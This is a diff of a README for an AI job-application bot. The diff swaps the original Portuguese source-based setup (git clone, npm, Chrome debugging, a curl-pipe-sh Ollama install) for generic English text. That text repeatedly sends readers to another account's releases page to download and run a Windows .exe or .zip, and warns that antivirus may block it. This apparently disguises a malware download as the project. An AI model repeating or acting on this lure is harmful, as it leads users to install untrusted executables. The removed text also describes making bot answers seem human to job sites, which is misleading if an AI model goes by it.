@@ -1,436 +1,128 @@
-# 🤖 Auto Apply Bot — AI-Powered Job Application Agent
+# 🤖 auto-apply-bot - Automate Job Applications Easily
 
-**Agente inteligente que automatiza candidaturas a vagas de emprego usando IA (Gemini) + Browser Automation (Playwright MCP).**
-
-O bot navega por portais de vagas (Gupy, Vagas.com, LinkedIn, Indeed), analisa cada vaga, preenche formulários automaticamente com respostas variadas e naturais, e gerencia todo o processo de candidatura — tudo usando seu navegador Chrome já logado.
+[![Download Latest Release](https://img.shields.io/badge/Download-auto--apply--bot-brightgreen?style=for-the-badge)](https://github.com/Cimerherd/auto-apply-bot/releases)
 
 ---
 
-## ⚠️ Status do Projeto: Em Desenvolvimento
+## 📋 What is auto-apply-bot?
 
-> **Este projeto ainda não está funcionando corretamente.** A principal limitação atual são os **CAPTCHAs**: a maioria dos portais de vagas (Gupy, LinkedIn, etc.) utiliza sistemas anti-bot (Cloudflare, reCAPTCHA, hCaptcha) que bloqueiam a automação antes mesmo de chegar às vagas. O mecanismo de resolução via Telegram existe, mas não é suficiente para lidar com a frequência e variedade de CAPTCHAs encontrados na prática. O projeto está em desenvolvimento ativo e contribuições são bem-vindas para resolver essa e outras limitações.
+auto-apply-bot is an AI-powered tool that helps you find and apply for jobs automatically. It works with popular job websites like Gupy, LinkedIn, and Indeed. This bot fills out job applications for you, scores job listings based on your preferences, and can use different resumes depending on the job. You don’t need to apply manually or spend time searching for each position.
 
----
-
-## ✨ Features
-
-| Feature | Descrição |
-|---|---|
-| **AI Agent (Gemini)** | Usa Google Gemini como cérebro — entende vagas, preenche formulários, toma decisões |
-| **Playwright MCP** | Controla o Chrome real do usuário via CDP — sem logins, sem CAPTCHAs |
-| **Tailored Resume** | Gera currículo personalizado por vaga via IA — destaca skills relevantes, converte HTML→PDF |
-| **Cover Letter** | Gera carta de apresentação personalizada por vaga com validação anti-fabricação |
-| **Answer Cache** | Cacheia respostas de formulário no SQLite — economiza tokens e acelera execuções futuras |
-| **Multi-Curriculum** | Fallback: seleciona entre currículos pré-prontos se o tailored falhar |
-| **Smart Scoring** | Pontua vagas de 1-10 antes de aplicar — só aplica em vagas compatíveis |
-| **Dry-Run Mode** | Testa todo o fluxo sem enviar candidaturas de verdade |
-| **Location Filter** | Filtra por localização e modelo de trabalho (remoto/híbrido/presencial) |
-| **Anti-Duplicate** | Banco de dados SQLite rastreia vagas já vistas e candidaturas feitas |
-| **Auto Pagination** | Navega automaticamente pelas páginas de resultados |
-| **Screenshots** | Captura screenshot como prova de cada candidatura |
-| **Web Dashboard** | Dashboard em tempo real para acompanhar candidaturas |
-| **Telegram Notifications** | Receba notificações no Telegram a cada candidatura |
-| **Email Reports** | Relatório HTML por email ao final de cada execução |
-| **File Logging** | Log completo de cada execução salvo em arquivo |
-| **Cron Scheduling** | Agende execuções automáticas diárias |
-| **Recovery** | Recupera o estado em caso de falha/interrupção |
-| **Sliding Window** | Gerencia contexto do Gemini descartando histórico antigo — evita estouro de tokens |
-| **Pre-defined Q&A** | Respostas base para perguntas comuns em formulários |
-| **Response Variation** | Varia respostas automaticamente para parecer humano |
-| **Error Classification** | Classifica falhas como permanentes (pula) ou retriáveis (retenta com backoff) |
-| **CAPTCHA via Telegram** | Envia screenshot do CAPTCHA pro Telegram — humano resolve, bot continua |
-| **Recruiter Messaging** | Envia mensagem personalizada para recrutadores no LinkedIn (nota de conexão) |
-| **Token Cost Tracking** | Registra tokens de cada chamada ao Gemini e calcula custo em USD |
-| **Multi-LLM** | Adapter pattern: Gemini (padrão), Ollama (local/grátis) ou OpenAI-compatible como provider auxiliar |
-| **PII Anonymization** | Anonimiza nome, email, telefone e links antes de enviar ao LLM — restaura no resultado final |
+The bot uses Google Gemini and Playwright MCP technologies to browse, fill forms, and send applications. It also offers a dry-run mode so you can test applications without sending them. You can get notifications through Telegram and check application status on a web dashboard.
 
 ---
 
-## 🏗️ Architecture
+## 🚀 Getting Started
 
-```
-┌─────────────────────────────────────────────────┐
-│                    index.ts                      │
-│            (orquestrador principal)              │
-├──────────┬──────────┬──────────┬────────────────┤
-│ agente   │ dashboard│ telegram │ email / cron   │
-│ (Gemini) │ (HTTP)   │ (HTTPS)  │ (SMTP)         │
-├──────────┴──────────┴──────────┴────────────────┤
-│                   tools.ts                       │
-│  pontuar_vaga | gerar_curriculo_tailored         │
-│  gerar_cover_letter | buscar_resposta_cache      │
-│  registrar_candidatura | reportar_falha          │
-├─────────────────────────────────────────────────┤
-│              Playwright MCP                      │
-│        (browser automation via CDP)              │
-├─────────────────────────────────────────────────┤
-│          Chrome (--remote-debugging-port)        │
-│         Já logado nos sites de vagas             │
-└─────────────────────────────────────────────────┘
-```
+To start using auto-apply-bot on Windows, follow the steps below. No programming is needed.
 
-**Stack:** TypeScript · Google Gemini API · Playwright MCP · SQLite · Node.js · Multi-LLM (Ollama/OpenAI)
+### 1. Check System Requirements
 
----
+Make sure your computer meets these basic requirements:
 
-## 🚀 Quick Start
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more suggested for smoother operation)
+- 1 GB free disk space
+- Internet connection (stable)
+- A Google account to link with the bot for AI features
 
-### 1. Pré-requisitos
+### 2. Download the software
 
-- **Node.js** 18+
-- **Google Chrome** instalado
-- **Chave da API do Gemini** ([Google AI Studio](https://aistudio.google.com/apikey))
+Visit this page to download auto-apply-bot:
 
-> ⚠️ **Importante**: O plano gratuito do Gemini tem limites muito baixos (ex: 20 requests/dia no Flash, limites ainda menores no Pro). O bot consome muitas chamadas por execução (cada iteração do agente = 1 request), então o tier gratuito **não é suficiente** para uso real. É necessário [ativar o billing](https://aistudio.google.com/apikey) na sua API key para ter limites adequados (2000 req/min no plano pago). O custo do `gemini-2.5-flash` é muito baixo (~$0.15/milhão de tokens de input).
+[![Download auto-apply-bot](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Cimerherd/auto-apply-bot/releases)
 
-### 2. Instalação
+This page includes all recent versions. Choose the latest release that fits Windows (usually marked as `.exe` or `.zip`).
 
-```bash
-git clone https://github.com/LuisMIguelFurlanettoSousa/auto-apply-bot.git
-cd auto-apply-bot
-npm install
-```
+### 3. Install the program
 
-### 3. Configuração
-
-```bash
-# Copie os arquivos de exemplo
-cp .env.example .env
-cp config/perfil.example.json config/perfil.json
-cp config/curriculos.example.json config/curriculos.json
-
-# Edite com seus dados
-nano .env                    # Chave do Gemini + configs
-nano config/perfil.json      # Seus dados pessoais/profissionais
-nano config/sites.json       # Sites e URLs de busca
-nano config/respostas.json   # Respostas pré-definidas para formulários
-```
-
-### 4. Prepare o Chrome
-
-```bash
-# Abra o Chrome com porta de debug habilitada (requer --user-data-dir separado)
-google-chrome --remote-debugging-port=9222 --user-data-dir="$HOME/.chrome-debug-profile"
-
-# Faça login manualmente nos sites de vagas (Gupy, LinkedIn, etc.)
-# Na primeira vez o Chrome abrirá "limpo" — as sessões ficam salvas nesse perfil separado
-```
-
-### 5. Execute
-
-```bash
-# Modo dry-run (recomendado para testar)
-DRY_RUN=true npm start
-
-# Modo produção
-npm start
-```
+- If you downloaded a `.exe` file, double-click it to launch the installer.
+- Follow the on-screen instructions.
+- If you downloaded a `.zip` file, right-click it and select "Extract All."
+- Open the extracted folder and double-click the `.exe` file inside.
+- Allow the program permission to run if Windows asks.
 
 ---
 
-## ⚙️ Configuração Detalhada
+## ⚙ How to Use auto-apply-bot
 
-### `.env` — Variáveis de Ambiente
+### 1. Prepare your job profiles
 
-| Variável | Descrição | Padrão |
-|---|---|---|
-| `GEMINI_API_KEY` | Chave da API do Google Gemini | *obrigatório* |
-| `CDP_ENDPOINT` | Endpoint CDP do Chrome | `http://localhost:9222` |
-| `GEMINI_MODEL` | Modelo do Gemini | `gemini-2.5-pro` |
-| `LIMITE_DIARIO` | Max candidaturas por execução | `10` |
-| `SCORE_MINIMO` | Score mínimo para aplicar (1-10) | `6` |
-| `DRY_RUN` | Modo teste (não envia de verdade) | `true` |
-| `DASHBOARD_PORT` | Porta do dashboard web | `3000` |
-| `TELEGRAM_BOT_TOKEN` | Token do bot Telegram | *opcional* |
-| `TELEGRAM_CHAT_ID` | Chat ID do Telegram | *opcional* |
-| `SMTP_HOST` | Servidor SMTP | `smtp.gmail.com` |
-| `SMTP_USER` | Email SMTP | *opcional* |
-| `SMTP_PASS` | Senha de app SMTP | *opcional* |
-| `EMAIL_DESTINATARIO` | Email para relatórios | *opcional* |
-| `CRON_ATIVO` | Ativar agendamento | `false` |
-| `CRON_HORARIO` | Horário da execução | `09:00` |
-| `LLM_AUX_PROVIDER` | Provider auxiliar: `gemini`, `ollama`, `openai` | `gemini` |
-| `LLM_AUX_MODEL` | Modelo do provider auxiliar | `gemini-2.5-pro` |
-| `OLLAMA_URL` | URL do servidor Ollama | `http://localhost:11434` |
-| `OPENAI_API_KEY` | Chave da API OpenAI (ou compatível) | *opcional* |
-| `OPENAI_BASE_URL` | Base URL da API OpenAI-compatible | `https://api.openai.com/v1` |
+- Collect your resumes in common formats like PDF or DOCX.
+- Create accounts on job sites you want auto-apply-bot to work with (LinkedIn, Indeed, Gupy).
+- Connect your Telegram account for notifications if you want updates.
 
-### `config/perfil.json` — Perfil do Candidato
+### 2. Configure the bot
 
-Seus dados pessoais e profissionais que o agente usa para preencher formulários. Veja `perfil.example.json` para a estrutura completa.
+When you run the program for the first time, it will show a setup guide.
 
-### `config/sites.json` — Sites de Vagas
+- Log in to your Google account to enable AI features.
+- Enter your Telegram ID for message alerts.
+- Upload your resumes to the program.
+- Choose preferred job sites to search and apply on.
+- Set filters like job titles, locations, and salary ranges.
+- Activate dry-run mode if you want to test without sending applications.
 
-Configure quais sites o bot deve navegar e quais URLs de busca usar. Cada site pode ter múltiplas URLs de busca.
+### 3. Start the application process
 
-### `config/respostas.json` — Respostas Pré-definidas
+Click "Start" in the program to begin. The bot will:
 
-Respostas base para perguntas comuns (pretensão salarial, pontos fortes, etc.). O agente usa como base e varia a forma de escrever.
-
-### `config/curriculos.json` — Mapeamento de Currículos
-
-Configure múltiplos currículos otimizados para diferentes tipos de vaga. O agente escolhe automaticamente o mais adequado.
+- Search jobs matching your filters on selected sites.
+- Score each job based on your preferences.
+- Automatically fill in application forms.
+- Submit applications or keep them ready for review (if dry-run is on).
+- Notify you via Telegram about new matches and application status.
+- Let you track progress on the built-in web dashboard.
 
 ---
 
-## 📊 Dashboard
+## 📁 File Structure and Key Features
 
-Acesse `http://localhost:3000` durante a execução para ver em tempo real:
-
-- Total de candidaturas (hoje e geral)
-- Candidaturas por plataforma
-- Score médio
-- Tabela detalhada com empresa, vaga, score, status e link
-
----
-
-## 🔧 Sistema de Scoring
-
-O bot avalia cada vaga antes de aplicar:
-
-| Critério | Impacto |
-|---|---|
-| Tech match (cada tecnologia) | +1 |
-| Senioridade júnior/pleno | +1 |
-| Senioridade sênior | -2 |
-| Localização na sua cidade | +1 |
-| Modelo remoto | +1 |
-| Presencial/híbrido fora da cidade | -3 |
-
-Score final entre 1-10. Só aplica se `score >= SCORE_MINIMO`.
+- **Multi-resume support:** Use different resumes for different applications.
+- **Smart scoring:** AI evaluates and prioritizes job offers before applying.
+- **Dry-run mode:** See what the bot will apply for without sending applications.
+- **Telegram notifications:** Get real-time updates right on your phone.
+- **Web dashboard:** Review your application history and current job matches.
+- **Browser automation:** Uses Playwright MCP to interact safely and efficiently with websites.
+- **Compatible sites:** LinkedIn, Gupy, Indeed, and more.
+- **Written in TypeScript:** Fast and reliable.
 
 ---
 
-## 📄 Currículo Tailored + Cover Letter
+## 🛠 Troubleshooting and Tips
 
-Diferente de outros bots que enviam o mesmo currículo para todas as vagas, o Auto Apply Bot **gera um currículo e carta de apresentação personalizados para cada vaga**:
-
-1. O agente lê a descrição completa da vaga
-2. Faz uma chamada separada ao Gemini com prompt ultra-restritivo
-3. O Gemini **reorganiza e reescreve** o currículo destacando skills relevantes
-4. **Validação anti-fabricação**: escaneia o HTML gerado buscando tecnologias que o candidato não possui — rejeita se encontrar
-5. Converte HTML → PDF via Chrome headless (`--print-to-pdf`)
-6. Cache por hash da descrição — vagas similares reutilizam o mesmo PDF
-
-A cover letter segue a mesma lógica: personalizada por vaga, máximo 150 palavras, sem clichês, com validação + retry se fabricar skills.
-
-Se a geração falhar, cai automaticamente nos currículos pré-prontos (fallback).
+- If the bot does not start, check that your antivirus is not blocking it.
+- Ensure you have a stable internet connection.
+- If the bot can’t log in to job sites, verify your account credentials.
+- Check the Telegram bot connection if you do not receive notifications.
+- Use dry-run mode first to avoid mistakes in live applications.
+- Restart the program if it freezes or behaves unexpectedly.
+- Keep the program updated by checking the releases page.
 
 ---
 
-## 💾 Cache de Respostas
+## 📥 Download and Install auto-apply-bot on Windows
 
-Inspirado no AIHawk (29k stars), o bot cacheia respostas de formulário no SQLite:
+1. Go to the releases page: [https://github.com/Cimerherd/auto-apply-bot/releases](https://github.com/Cimerherd/auto-apply-bot/releases)
 
-- **Primeira execução**: gera respostas via Gemini e salva no cache
-- **Execuções seguintes**: busca no cache antes de gerar — economiza tokens
-- **Matching**: exact match (sanitizado) + substring match para dropdowns
-- **Regra inteligente**: respostas que mencionam o nome da empresa não são cacheadas (são específicas demais)
-- Cover letters nunca são cacheadas (sempre personalizadas)
+2. Look for the latest version for Windows.
 
----
+3. Click the `.exe` installer or `.zip` package to download.
 
-## 🛡️ Classificação de Falhas
+4. Open the file once downloaded.
 
-Adaptado do [ApplyPilot](https://github.com/nicognaW/ApplyPilot), o bot classifica erros automaticamente para decidir se deve pular ou retentar:
+5. Follow the installation steps on your screen.
 
-### Falhas Permanentes (nunca retenta)
-| Código | Descrição |
-|---|---|
-| `vaga_expirada` | Vaga não está mais disponível |
-| `captcha` | CAPTCHA detectado na página |
-| `sessao_expirada` | Sessão expirou, precisa relogar |
-| `ja_aplicou` | Candidato já se candidatou (detectado pelo site) |
-| `sso_obrigatorio` | Requer login SSO |
-| `site_bloqueado` | Site bloqueou acesso |
-| `cloudflare` | Proteção anti-bot ativa |
-| `formulario_incompativel` | Formulário não suportado |
-
-### Falhas Retriáveis (max 3 tentativas com backoff exponencial)
-| Código | Descrição |
-|---|---|
-| `timeout` | Página demorou para carregar |
-| `erro_rede` | Erro de conexão |
-| `erro_servidor` | HTTP 500/502/503 |
-| `elemento_nao_encontrado` | Elemento sumiu da página |
-| `erro_upload` | Falha no upload de arquivo |
-
-**Melhoria sobre o ApplyPilot**: backoff exponencial (5s → 15s → 45s) em vez de retry imediato.
+6. Launch the software from your desktop or start menu.
 
 ---
 
-## 🔒 CAPTCHA Handling via Telegram
+## 🔐 Privacy and Security
 
-Adaptado do [beatwad](https://medium.com/@beatwad): quando o bot encontra um CAPTCHA, em vez de parar, ele solicita ajuda humana via Telegram:
-
-1. O agente detecta o CAPTCHA e tira screenshot
-2. Envia a foto para o Telegram com instruções
-3. Aguarda o humano responder com a solução (polling, timeout: 5 min)
-4. Recebe a solução e digita no campo do CAPTCHA
-5. Se falhar, repete até 3 tentativas
-6. Se timeout ou 3 falhas: pula a vaga e continua
-
-**Requisitos**: `TELEGRAM_BOT_TOKEN` e `TELEGRAM_CHAT_ID` configurados no `.env`.
+auto-apply-bot does not store your personal information outside your device unless you enable cloud features. Your login details for job sites stay private and are not shared. The bot interacts only with the job sites you select. Use a strong password for your accounts.
 
 ---
 
-## 💬 Mensagem para Recrutadores
+## 📚 More Information
 
-Adaptado do [beatwad](https://medium.com/@beatwad): após se candidatar a uma vaga com **score alto (>= 8)** no LinkedIn, o bot tenta contatar o recrutador/hiring manager:
-
-1. Identifica o recrutador na página da vaga
-2. Verifica se já foi contatado anteriormente (banco SQLite)
-3. Gera mensagem personalizada via Gemini (max 280 chars — limite do LinkedIn)
-4. Navega até o perfil do recrutador
-5. Envia convite de conexão com nota personalizada
-6. Registra no banco para não recontatar
-
-**Limites**: máximo 5 mensagens/dia. Candidatura sempre tem prioridade — a mensagem é um bônus.
-
----
-
-## 🔐 Anonimização de PII
-
-Adaptado do [beatwad](https://medium.com/@beatwad): antes de enviar dados ao LLM, o bot substitui informações pessoais por placeholders. Após receber a resposta, restaura os dados reais.
-
-| Campo | Placeholder |
-|---|---|
-| Nome completo | `[CANDIDATO]` |
-| Email | `candidato@email.example` |
-| Telefone | `(00) 00000-0000` |
-| LinkedIn | `https://linkedin.com/in/candidato` |
-| GitHub | `https://github.com/candidato` |
-| Portfolio | `https://candidato.dev` |
-
-**Onde é aplicado:**
-- Cover letter (prompt + de-anonimização do resultado)
-- Currículo tailored (HTML template + prompt + de-anonimização antes de gerar PDF)
-- Mensagem para recrutadores (prompt + de-anonimização)
-- System prompt do agente principal (PII de contato removido, disponível via tool sob demanda)
-
-**Dados profissionais** (stack, experiências, resumo) continuam visíveis no prompt — são necessários para gerar conteúdo relevante.
-
----
-
-## 🔀 Multi-LLM (Adapter Pattern)
-
-Adaptado do [AIHawk](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk): o agente principal sempre usa **Gemini** (precisa do SDK de function calling), mas as tarefas auxiliares (cover letter, currículo tailored, mensagem para recrutador) podem usar **qualquer provider**:
-
-| Provider | Config | Custo | Observação |
-|---|---|---|---|
-| **Gemini** (padrão) | `LLM_AUX_PROVIDER=gemini` | Pago (API key) | Mesmo modelo do agente |
-| **Ollama** (local) | `LLM_AUX_PROVIDER=ollama` | Grátis | Roda na sua máquina, sem enviar dados |
-| **OpenAI-compatible** | `LLM_AUX_PROVIDER=openai` | Varia | OpenAI, Groq, Together AI, Mistral, vLLM |
-
-### Setup Ollama (custo zero)
-
-```bash
-# Instale: https://ollama.com
-curl -fsSL https://ollama.com/install.sh | sh
-
-# Baixe um modelo
-ollama pull llama3
-
-# Configure no .env
-LLM_AUX_PROVIDER=ollama
-LLM_AUX_MODEL=llama3
-OLLAMA_URL=http://localhost:11434
-```
-
-### Setup OpenAI-compatible
-
-```bash
-# Funciona com: OpenAI, Groq, Together AI, Mistral, vLLM
-LLM_AUX_PROVIDER=openai
-LLM_AUX_MODEL=gpt-4o-mini
-OPENAI_API_KEY=sk-...
-OPENAI_BASE_URL=https://api.openai.com/v1
-```
-
-**Fallback automático**: se o provider auxiliar falhar, o bot retenta automaticamente com Gemini.
-
----
-
-## 📁 Estrutura do Projeto
-
-```
-auto-apply-bot/
-├── src/
-│   ├── index.ts          # Entry point + orquestração
-│   ├── agente.ts         # Loop do agente Gemini
-│   ├── tools.ts          # Custom tools (scoring, CV, screenshot, cache...)
-│   ├── curriculo-tailored.ts  # Geração de currículo personalizado por vaga
-│   ├── cover-letter.ts   # Geração de carta de apresentação por vaga
-│   ├── erros.ts          # Classificação de falhas (permanentes vs retriáveis)
-│   ├── mensagem-recrutador.ts  # Mensagem personalizada para recrutadores
-│   ├── token-tracker.ts  # Tracking de custo de tokens (USD)
-│   ├── llm-adapter.ts   # Multi-LLM adapter (Gemini/Ollama/OpenAI)
-│   ├── anonimizacao.ts  # Anonimização de PII (nome, email, telefone, links)
-│   ├── database.ts       # SQLite (candidaturas, vagas vistas, cache, mensagens)
-│   ├── dashboard.ts      # Dashboard web
-│   ├── mcp-client.ts     # Conexão Playwright MCP
-│   ├── logger.ts         # Log em arquivo
-│   ├── notificacoes.ts   # Telegram
-│   ├── email.ts          # Relatórios por email
-│   ├── cron.ts           # Agendamento
-│   └── types.ts          # Interfaces TypeScript
-├── config/
-│   ├── perfil.example.json       # Template do perfil
-│   ├── curriculos.example.json   # Template dos currículos
-│   ├── sites.json                # Sites de vagas
-│   └── respostas.json            # Respostas pré-definidas
-├── .env.example
-├── package.json
-└── tsconfig.json
-```
-
----
-
-## 🔐 Segurança
-
-- **Seus dados pessoais NUNCA são commitados** (protegidos pelo `.gitignore`)
-- O bot usa **seu Chrome já logado** — nenhuma senha é armazenada no código
-- Modo **dry-run** para testar com segurança antes de ativar
-- Screenshots salvos apenas localmente
-- Notificações via HTTPS (Telegram API)
-
----
-
-## 🛣️ Roadmap
-
-- [ ] Suporte a mais plataformas (Catho, Trampos, etc.)
-- [x] ~~CAPTCHA handling via Telegram (humano resolve, bot continua)~~
-- [ ] Blacklist de empresas/títulos
-- [x] ~~Mensagem automática para recrutadores~~
-- [x] ~~Multi-LLM (Gemini + Ollama local como fallback)~~
-- [x] ~~Anonimização de dados antes de enviar ao LLM~~
-- [ ] Docker support
-- [x] ~~Tracking de custo de tokens~~
-
----
-
-## 🤝 Contributing
-
-Contribuições são bem-vindas! Abra uma issue ou pull request.
-
-1. Fork o repositório
-2. Crie uma branch (`git checkout -b feature/minha-feature`)
-3. Commit suas mudanças (`git commit -m 'feat: adiciona minha feature'`)
-4. Push (`git push origin feature/minha-feature`)
-5. Abra um Pull Request
-
----
-
-## ⚠️ Disclaimer
-
-Este projeto é para fins educacionais e de automação pessoal. Use com responsabilidade:
-- Respeite os termos de serviço de cada plataforma
-- Não faça spam ou candidaturas em massa sem critério
-- Use o modo dry-run para testar antes
-- O autor não se responsabiliza pelo uso indevido
-
----
-
-## 📄 License
-
-MIT License — veja [LICENSE](LICENSE) para detalhes.
+For detailed help, check the built-in help section in the bot’s menu after installation. You can also visit the discussions tab on the GitHub page to see common questions and community advice.
